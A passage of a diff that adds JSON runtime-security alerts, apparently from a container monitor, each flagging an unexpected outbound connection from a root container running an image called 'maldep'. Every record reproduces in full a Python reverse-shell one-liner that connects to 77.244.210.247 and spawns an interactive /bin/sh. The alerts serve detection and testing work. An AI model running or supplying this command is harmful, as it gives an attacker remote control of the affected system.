+      "output": "09:07:23.044444479: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22921)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:58460->77.244.210.247:22921 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "container.image.repository": "maldep",
+        "user.name": "root",
+        "evt.time": "09:07:23.390498960",
+        "container.id": "3915af6ed50f",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "fd.name": "0.0.0.0:36992->77.244.210.247:22922",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22922)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);"
+      },
+      "time": {
+        "seconds": "1764752843",
+        "nanos": 390498960
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:23.390498960: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22922)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:36992->77.244.210.247:22922 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "fd.name": "0.0.0.0:50142->77.244.210.247:22923",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "container.id": "3915af6ed50f",
+        "user.name": "root",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22923)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.image.repository": "maldep",
+        "evt.time": "09:07:23.839153765"
+      },
+      "time": {
+        "seconds": "1764752843",
+        "nanos": 839153765
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:23.839153765: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22923)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:50142->77.244.210.247:22923 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "fd.name": "0.0.0.0:35392->77.244.210.247:22924",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22924)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.id": "3915af6ed50f",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "container.image.repository": "maldep",
+        "evt.time": "09:07:24.323303447",
+        "user.name": "root"
+      },
+      "time": {
+        "seconds": "1764752844",
+        "nanos": 323303447
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:24.323303447: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22924)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:35392->77.244.210.247:22924 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22925)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "evt.time": "09:07:24.802141867",
+        "user.name": "root",
+        "container.image.repository": "maldep",
+        "container.id": "3915af6ed50f",
+        "fd.name": "0.0.0.0:49676->77.244.210.247:22925"
+      },
+      "time": {
+        "seconds": "1764752844",
+        "nanos": 802141867
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:24.802141867: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22925)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:49676->77.244.210.247:22925 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "container.image.repository": "maldep",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22926)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "user.name": "root",
+        "evt.time": "09:07:25.295382773",
+        "fd.name": "0.0.0.0:53138->77.244.210.247:22926",
+        "container.id": "3915af6ed50f"
+      },
+      "time": {
+        "seconds": "1764752845",
+        "nanos": 295382773
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:25.295382773: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22926)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:53138->77.244.210.247:22926 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22927)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "user.name": "root",
+        "container.image.repository": "maldep",
+        "container.id": "3915af6ed50f",
+        "fd.name": "0.0.0.0:45070->77.244.210.247:22927",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "evt.time": "09:07:25.760294856"
+      },
+      "time": {
+        "seconds": "1764752845",
+        "nanos": 760294856
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:25.760294856: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22927)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:45070->77.244.210.247:22927 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "container.id": "3915af6ed50f",
+        "user.name": "root",
+        "evt.time": "09:07:26.107097860",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "container.image.repository": "maldep",
+        "fd.name": "0.0.0.0:56998->77.244.210.247:22928",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22928)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);"
+      },
+      "time": {
+        "seconds": "1764752846",
+        "nanos": 107097860
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:26.107097860: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22928)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:56998->77.244.210.247:22928 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22929)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "container.image.repository": "maldep",
+        "container.id": "3915af6ed50f",
+        "user.name": "root",
+        "fd.name": "0.0.0.0:38470->77.244.210.247:22929",
+        "evt.time": "09:07:26.562266557"
+      },
+      "time": {
+        "seconds": "1764752846",
+        "nanos": 562266557
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:26.562266557: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22929)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:38470->77.244.210.247:22929 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "container.image.repository": "maldep",
+        "fd.name": "0.0.0.0:32836->77.244.210.247:22930",
+        "container.id": "3915af6ed50f",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "evt.time": "09:07:27.044309029",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22930)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "user.name": "root"
+      },
+      "time": {
+        "seconds": "1764752847",
+        "nanos": 44309029
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:27.044309029: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22930)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:32836->77.244.210.247:22930 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "fd.name": "0.0.0.0:41884->77.244.210.247:22931",
+        "container.image.repository": "maldep",
+        "evt.time": "09:07:27.362202260",
+        "container.id": "3915af6ed50f",
+        "user.name": "root",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22931)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz"
+      },
+      "time": {
+        "seconds": "1764752847",
+        "nanos": 362202260
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:27.362202260: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22931)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:41884->77.244.210.247:22931 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22932)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "fd.name": "0.0.0.0:58070->77.244.210.247:22932",
+        "container.id": "3915af6ed50f",
+        "container.image.repository": "maldep",
+        "user.name": "root",
+        "evt.time": "09:07:27.841621618"
+      },
+      "time": {
+        "seconds": "1764752847",
+        "nanos": 841621618
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:27.841621618: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22932)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:58070->77.244.210.247:22932 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22933)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "evt.time": "09:07:28.334217683",
+        "user.name": "root",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "fd.name": "0.0.0.0:43620->77.244.210.247:22933",
+        "container.image.repository": "maldep",
+        "container.id": "3915af6ed50f"
+      },
+      "time": {
+        "seconds": "1764752848",
+        "nanos": 334217683
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:28.334217683: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22933)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:43620->77.244.210.247:22933 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "fd.name": "0.0.0.0:53030->77.244.210.247:22934",
+        "container.image.repository": "maldep",
+        "user.name": "root",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22934)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.id": "3915af6ed50f",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "evt.time": "09:07:28.808270381"
+      },
+      "time": {
+        "seconds": "1764752848",
+        "nanos": 808270381
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:28.808270381: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22934)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:53030->77.244.210.247:22934 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "container.image.repository": "maldep",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "user.name": "root",
+        "evt.time": "09:07:29.289953484",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22935)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.id": "3915af6ed50f",
+        "fd.name": "0.0.0.0:54710->77.244.210.247:22935"
+      },
+      "time": {
+        "seconds": "1764752849",
+        "nanos": 289953484
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:29.289953484: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22935)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:54710->77.244.210.247:22935 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22936)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.id": "3915af6ed50f",
+        "user.name": "root",
+        "evt.time": "09:07:29.768403523",
+        "fd.name": "0.0.0.0:34258->77.244.210.247:22936",
+        "container.image.repository": "maldep",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz"
+      },
+      "time": {
+        "seconds": "1764752849",
+        "nanos": 768403523
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:29.768403523: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22936)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:34258->77.244.210.247:22936 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "user.name": "root",
+        "evt.time": "09:07:30.244735710",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22937)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "fd.name": "0.0.0.0:55460->77.244.210.247:22937",
+        "container.image.repository": "maldep",
+        "container.id": "3915af6ed50f",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz"
+      },
+      "time": {
+        "seconds": "1764752850",
+        "nanos": 244735710
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:30.244735710: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22937)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:55460->77.244.210.247:22937 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "evt.time": "09:07:30.593847087",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22938)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "user.name": "root",
+        "container.id": "3915af6ed50f",
+        "fd.name": "0.0.0.0:34794->77.244.210.247:22938",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "container.image.repository": "maldep"
+      },
+      "time": {
+        "seconds": "1764752850",
+        "nanos": 593847087
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:30.593847087: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22938)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:34794->77.244.210.247:22938 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "container.id": "3915af6ed50f",
+        "container.image.repository": "maldep",
+        "fd.name": "0.0.0.0:34188->77.244.210.247:22939",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22939)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "evt.time": "09:07:30.928460447",
+        "user.name": "root"
+      },
+      "time": {
+        "seconds": "1764752850",
+        "nanos": 928460447
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:30.928460447: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22939)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:34188->77.244.210.247:22939 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "container.id": "3915af6ed50f",
+        "fd.name": "0.0.0.0:58912->77.244.210.247:22940",
+        "user.name": "root",
+        "container.image.repository": "maldep",
+        "evt.time": "09:07:31.258218450",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22940)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);"
+      },
+      "time": {
+        "seconds": "1764752851",
+        "nanos": 258218450
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:31.258218450: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22940)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:58912->77.244.210.247:22940 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "evt.time": "09:07:31.619613247",
+        "user.name": "root",
+        "container.image.repository": "maldep",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "container.id": "3915af6ed50f",
+        "fd.name": "0.0.0.0:56442->77.244.210.247:22941",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22941)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);"
+      },
+      "time": {
+        "seconds": "1764752851",
+        "nanos": 619613247
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:31.619613247: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22941)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:56442->77.244.210.247:22941 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "evt.time": "09:07:32.005999088",
+        "fd.name": "0.0.0.0:53634->77.244.210.247:22942",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "user.name": "root",
+        "container.image.repository": "maldep",
+        "container.id": "3915af6ed50f",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22942)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);"
+      },
+      "time": {
+        "seconds": "1764752852",
+        "nanos": 5999088
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:32.005999088: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22942)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:53634->77.244.210.247:22942 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "evt.time": "09:07:32.495015301",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "user.name": "root",
+        "fd.name": "0.0.0.0:42240->77.244.210.247:22943",
+        "container.image.repository": "maldep",
+        "container.id": "3915af6ed50f",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22943)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);"
+      },
+      "time": {
+        "seconds": "1764752852",
+        "nanos": 495015301
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
